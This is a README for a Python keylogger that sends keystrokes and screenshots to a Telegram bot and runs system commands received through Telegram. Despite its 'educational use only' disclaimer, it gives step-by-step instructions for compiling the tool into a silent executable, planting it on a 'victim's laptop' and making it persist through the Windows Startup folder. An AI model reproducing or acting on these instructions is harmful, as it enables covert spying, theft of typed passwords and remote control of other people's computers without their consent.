## 🔐 Telegram Keylogger (For Educational Use Only)

A Python-based keylogger that logs keystrokes, captures screenshots, and accepts remote system commands — all securely in your Telegram bot.


## ⚠️ Disclaimer:
This tool is intended strictly for educational purposes in a controlled, personal lab environment only.
Unauthorized use to monitor others without consent is illegal and unethical.

## Overview
Keylogger.py is a multi-functional monitoring tool that:

- ✅ Logs keystrokes in real time

- 🖼️ Captures screenshots every 10 minutes

- 📬 Sends both to a private Telegram bot

- 💻 Supports remote command execution via Telegram messages

## Features
- ⌨️ Keystroke logging with buffer and formatting

- 🖼️ Screenshot capture every 10 minutes (compressed JPEG)

- 📬 Telegram integration for sending logs and images

- 🧹 Automatic deletion of screenshots after successful upload

- 🔁 Multithreaded execution for continuous background operation

- 🔐 Remote command execution: Run system commands via Telegram (e.g., shutdown /s)

- ❌ No third-party storage or cloud integration — data goes only to Telegram

##  🚀 Setup Instructions
1. Clone or Download the Script

`git clone https://github.com/khadkauj/Keylogger.git`

`cd Keylogger`

2. Create a Telegram Bot
- Open Telegram and search @BotFather

- Use /newbot and follow prompts to get your bot token

- Save your token for later

3. Get Your Telegram Chat ID
- Start a chat with your bot

- Visit the following URL in your browser:

`https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`

- Send a message to the bot, then refresh the URL

- Look for "chat":{"id":123456789,...} — that’s your chat ID

4. Install Dependencies
- Make sure you're using Python 3.9+ (for zoneinfo) and have the following libraries:


`pip install pynput Pillow requests`

5. Configure the Script
- Edit these lines in the script:

`TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"`
`TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"`

6. Run the Script

`pip install -r requirements.txt`

`python Keylogger.py`


The script will begin 
- sending keystrokes and screenshots(both every 5 minute; you can change the time limit in code), and 
- listening for remote commands via Telegram.

## Remote Command Execution
Send a plain text message to your bot and it will be executed as a system command.

Examples:

shutdown /s
hostname
systeminfo

⚠️ All commands are executed with the same privileges as the user running the script. Be careful with destructive or administrative commands.

## 🧪 EXE Compilation

The real fun comes when you compile this code into .exe application and plant it into victim's laptop. 

`pip install pyinstaller`

Use the following command to bundle the script:

`pyinstaller --onefile --noconsole Keylogger.py`

- --onefile: bundles everything into a single .exe

- --noconsole: runs silently in background (no terminal window)

The .exe file will appear in the dist/ directory.

You can place the .exe in the Startup folder, this way it start automatically everytime victim starts their computer.

- open Windows + R and type `shell:startup`. This opens up startup application folder. Move the executbale file here and you're done. It will keep doing its work in background.

##  ⚠️ Important Warning and  Safety tips

- This executable is for personal lab use only.

- Do not install or deploy this on any machine that you do not fully own or have explicit written consent to test.

- Do not distribute this code without including this README and disclaimer.

- Always respect privacy and cyber laws.

## 📜 License
This project is for educational purposes only and does not come with any license for malicious use.

Use at your own risk. The developer is not responsible for any misuse.